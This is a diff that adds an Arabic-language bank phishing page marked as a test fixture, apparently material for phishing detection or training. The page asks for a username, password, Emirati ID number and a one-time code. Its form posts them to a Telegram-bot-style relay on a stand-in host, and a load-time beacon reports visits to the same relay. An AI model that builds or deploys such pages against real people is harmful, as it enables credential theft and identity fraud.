@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<title>بنك الصقر التجريبي - تسجيل الدخول</title>
+<meta name="robots" content="noindex">
+<link rel="icon" type="image/png" href="http://falcon-demo-bank.test/assets/favicon.png">
+<link rel="stylesheet" href="http://falcon-demo-bank.test/assets/style.css">
+</head>
+<body>
+<div class="fl-banner">TEST FIXTURE, not a real site / صفحة اختبار، ليست موقعاً حقيقياً</div>
+<header><img src="http://falcon-demo-bank.test/assets/logo.png" alt="" width="80" height="80"><h1>Falcon Demo Bank</h1></header>
+<main>
+<p>تم تقييد حسابك. أدخل بياناتك للتحقق من الهوية والمتابعة.</p>
+<form action="http://falcon-bot-relay.test/bot123456:FAKE/sendMessage" method="post">
+<label>اسم المستخدم <input type="text" name="u"></label>
+<label>كلمة المرور <input type="password" name="p"></label>
+<label>رقم الهوية الإماراتية <input type="text" name="eid" placeholder="784-XXXX-XXXXXXX-X"></label>
+<label>رمز التحقق <input type="text" name="code" inputmode="numeric" maxlength="6"></label>
+<button type="submit">تحقق</button>
+</form>
+</main>
+<script>
+navigator.sendBeacon("http://falcon-bot-relay.test/bot123456:FAKE/sendMessage", "visit");
+</script>
+</body>
+</html>
